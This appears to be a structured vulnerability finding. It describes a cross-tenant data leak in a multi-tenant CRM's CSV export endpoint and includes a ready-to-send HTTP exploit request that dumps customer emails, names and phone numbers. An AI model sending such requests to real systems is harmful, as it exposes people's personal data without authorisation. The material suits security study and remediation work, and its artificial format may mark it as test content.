diagnosis: CustomerProfileViewSet properly implements get_queryset() to isolate customer profiles by tenant for standard CRUD actions, but defines a custom export_csv action that queries CustomerProfile.objects.all() directly instead of calling self.get_queryset(). Passing export-csv with arbitrary fields dumps customer records across all tenants in CSV format.
exploit_request:
GET /api/customers/export-csv/?fields=id,email,full_name,phone_number HTTP/1.1
Host: api.multitenantcrm.com
Authorization: Bearer tenant_9_user
Accept: text/csv
